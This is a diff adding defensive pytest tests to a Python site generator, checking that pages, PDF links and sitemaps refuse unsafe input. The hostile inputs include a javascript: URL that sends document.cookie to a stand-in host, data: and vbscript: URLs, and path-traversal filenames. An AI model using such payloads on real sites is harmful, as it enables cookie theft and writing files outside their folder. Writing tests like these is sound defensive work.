@@ -2395,6 +2395,17 @@ def test_every_site_seam_fails_soft(monkeypatch, tmp_path):
         mp.setattr(site, "DOCS", tmp_path)
         mp.setattr(site, "TOOLS_DIR", tmp_path / "tools")
         mp.setattr(site, "render_page", boom)
+        # one unrenderable row is SKIPPED, and the index + sitemap below it are still
+        # written: aborting the loop froze the whole site at its last good state
+        # forever, while publish_page still returned a URL and the ledger still said
+        # tool_page=True. Nothing about that was visible in the log.
+        assert site.rebuild([_entry()]) == 2
+        assert (tmp_path / "index.html").exists() and (tmp_path / "sitemap.xml").exists()
+    with pytest.MonkeyPatch.context() as mp:
+        mp.setattr(site.fv, "setting", _settings())
+        mp.setattr(site, "DOCS", tmp_path)
+        mp.setattr(site, "TOOLS_DIR", tmp_path / "tools")
+        mp.setattr(site, "render_index", boom)         # outside the loop -> -1, no raise
         assert site.rebuild([_entry()]) == -1
     with pytest.MonkeyPatch.context() as mp:
         mp.setattr(site.fv, "setting", _settings())
@@ -2521,3 +2532,133 @@ def test_run_pops_a_planted_cheat_sheet_before_it_is_published():
     ap.place_description_blocks(s)
     assert "PLANTED" not in s["description"]
     assert s["cheat_sheet"].endswith("-real-title.pdf")
+
+
+# ---- v3-F.1 review pass: 9 reproduced defects, one test each ----------------
+def test_a_name_planted_in_a_LATER_rewrite_pass_dies_too():
+    """The first fix popped `cheat_sheet` once in run() — but critique_pass,
+    enforce_length and enforce_max_length all run AFTER that pop, and _carry_over
+    only restores a key it finds in the source. A name planted in the critique
+    answer therefore survived, and place_description_blocks ('and not
+    script.get("cheat_sheet")') declined to overwrite it: the live video shipped
+    '.../tools/' with no file name at all when safe_name reduced it to ''.
+
+    The pop belongs INSIDE _validate_script, which every pass runs before
+    _carry_over hands the legitimate value back."""
+    planted = {"title": "T", "description": "hook.\n\nbody", "tags": [],
+               "cheat_sheet": "...", "receipts": {"kind": "pip", "mb": 999},
+               "scenes": [{"narration": "w " * 40, "visual_query": "v"} for _ in range(6)]}
+    v = ap._validate_script(dict(planted), "T", "https://github.com/x/y")
+    assert "cheat_sheet" not in v and "receipts" not in v      # both plants dropped
+
+    # ...and the real one still survives the pass, because _carry_over restores it
+    real = dict(v, cheat_sheet="2026-08-31-real.pdf", receipts={"kind": "pip", "mb": 1})
+    carried = ap._carry_over(real, ap._validate_script(dict(planted), "T", ""))
+    assert carried["cheat_sheet"] == "2026-08-31-real.pdf"
+    assert carried["receipts"]["mb"] == 1
+
+
+def test_the_page_never_offers_a_pdf_that_was_not_written(monkeypatch, tmp_path):
+    """make_cheat_sheet is fail-soft (None on a reportlab failure or a <1KB file).
+    run() has that answer; entry_for used to ignore it and render the download
+    button anyway, so the page shipped a 404 on exactly the day the PDF seam failed."""
+    monkeypatch.setattr(site.fv, "setting", _settings())
+    s = dict(_tool_script(5), cheat_sheet="2026-08-31-t.pdf", title="T")
+    wrote = site.entry_for(s, {}, "", pdf="2026-08-31-t.pdf")
+    failed = site.entry_for(s, {}, "", pdf=None if False else "")   # make_cheat_sheet -> None
+    assert wrote["pdf"] == "2026-08-31-t.pdf" and failed["pdf"] == ""
+    assert "Download the 1-page PDF" in site.render_page(wrote)
+    assert "Download the 1-page PDF" not in site.render_page(failed)
+    # the page itself is still written — only the button is gone
+    assert failed["page"] == "2026-08-31-t.html"
+
+
+def test_pdf_href_and_the_written_file_are_the_same_name(monkeypatch):
+    """entry_for sanitized `page` but stored `pdf` raw, so the moment safe_name
+    changed anything the button pointed somewhere the PDF was never written."""
+    monkeypatch.setattr(site.fv, "setting", _settings())
+    e = site.entry_for({"title": "T", "cheat_sheet": "../../../../CNAME.pdf"}, {}, "",
+                       pdf="../../../../CNAME.pdf")
+    assert e["pdf"] == "CNAME.pdf" == dlv.safe_name("../../../../CNAME.pdf")
+    h = site.render_page(e)
+    assert 'href="CNAME.pdf"' in h
+    assert "../../" not in h          # only the brand's own ../index.html may be relative
+    assert h.count("../") == 1
+    # and a long name keeps the extension it is looked up by
+    long_pdf = dlv.safe_name("2026-08-31-" + "x" * 300 + ".pdf")
+    assert long_pdf.endswith(".pdf") and len(long_pdf) <= 120
+    assert site.page_name(long_pdf).endswith(".html")
+
+
+def test_a_non_http_source_url_is_never_linked(monkeypatch):
+    """deliverable.url is written by a model grounded in a third-party README, and
+    the page is served from our own Pages origin. html.escape cannot help: a scheme
+    is not a metacharacter. screencap.py already refuses this same field."""
+    monkeypatch.setattr(site.fv, "setting", _settings())
+    for bad in ("javascript:fetch('https://evil.test/'+document.cookie)",
+                "data:text/html;base64,PHNjcmlwdD4=", "vbscript:x", "  JavaScript:alert(1)"):
+        e = site.entry_for({"title": "T", "cheat_sheet": "a.pdf",
+                            "deliverable": {"text": "pip install x", "url": bad}}, {}, "")
+        assert e["source_url"] == "", bad
+        assert "javascript" not in site.render_page(e).lower()
+        assert "data:text/html" not in site.render_page(e)
+    ok = site.entry_for({"title": "T", "cheat_sheet": "a.pdf",
+                         "deliverable": {"text": "x", "url": "https://github.com/x/y"}}, {}, "")
+    assert ok["source_url"] == "https://github.com/x/y"
+
+
+def test_every_url_surface_uses_the_same_sanitized_name(monkeypatch, tmp_path):
+    """rebuild() sanitized only the FILE it wrote; the canonical, the index href and
+    the sitemap <loc> interpolated the raw `page` — so they could advertise a URL the
+    generator had deliberately refused to create. The catalog is merged state read
+    back off origin/main, so it is the input trusted least."""
+    monkeypatch.setattr(site.fv, "setting", _settings(deliverable_base_url="https://x.test"))
+    monkeypatch.setattr(site, "DOCS", tmp_path)
+    monkeypatch.setattr(site, "TOOLS_DIR", tmp_path / "tools")
+    hostile = [_entry(page="../../../pwned.html"), _entry(page='q".html'),
+               _entry(page="no-extension"), _entry()]
+    site.rebuild(hostile)
+    on_disk = sorted(p.name for p in (tmp_path / "tools").iterdir())
+    index = (tmp_path / "index.html").read_text(encoding="utf-8")
+    smap = (tmp_path / "sitemap.xml").read_text(encoding="utf-8")
+    assert on_disk == ["2026-08-31-a.html", "pwned.html", "q-.html"]
+    for name in on_disk:
+        assert f'href="tools/{name}"' in index
+        assert f"https://x.test/tools/{name}" in smap
+    assert "../" not in index and "../" not in smap
+    assert "no-extension" not in index and "no-extension" not in smap   # never written
+    import xml.etree.ElementTree as ET
+    assert len(ET.fromstring(smap)) == 4                                # parses; root + 3
+
+
+def test_sitemap_filters_before_it_sorts():
+    """The isinstance guard ran on sorted()'s OUTPUT, so the non-dict it was written
+    for reached .get() first — and that raise skipped the index write above it."""
+    rows = [{"page": "a.html", "date": "2026-01-01"}, "junk", None, 42]
+    assert site.render_sitemap(rows).count("<url>") == 2       # root + the one real row
+    assert site.render_index(rows).count('class="row"') == 1
+    assert site.render_sitemap([]).endswith("</urlset>")
+
+
+def test_the_kill_switch_can_be_flipped_from_the_environment(monkeypatch, tmp_path):
+    """fv.setting returns an env var as a STRING and bool("false") is True, so the
+    switch was un-flippable from Actions — receipts_check uses fv.flag for exactly
+    this reason (spec #13 said 'matches receipts_check')."""
+    monkeypatch.setattr(site, "CATALOG", tmp_path / "cat.json")
+    monkeypatch.setenv("SITE_PAGES", "false")
+    assert site.enabled() is False
+    monkeypatch.setenv("SITE_PAGES", "true")
+    assert site.enabled() is True
+    monkeypatch.delenv("SITE_PAGES")
+    monkeypatch.setattr(site.fv, "setting", _settings(site_pages="false"))
+    assert site.enabled() is False                       # a string in config.json too
+
+
+def test_catalog_merge_survives_a_scalar_body():
+    """merge_file's caller in CI has no `|| true`; under `bash -e` a TypeError here
+    aborts the whole state-save step — the 'lose all state' path CLAUDE.md names."""
+    good = json.dumps([{"page": "a.html", "date": "2026-01-01"}])
+    for junk in ("42", '"a string"', "null", "true", '{"page": "a.html"}'):
+        out = sm.merge_file("state/tools_index.json", junk, good)
+        assert json.loads(out) == [{"page": "a.html", "date": "2026-01-01"}], junk
+        assert sm.merge_file("state/tools_index.json", good, junk) is not None
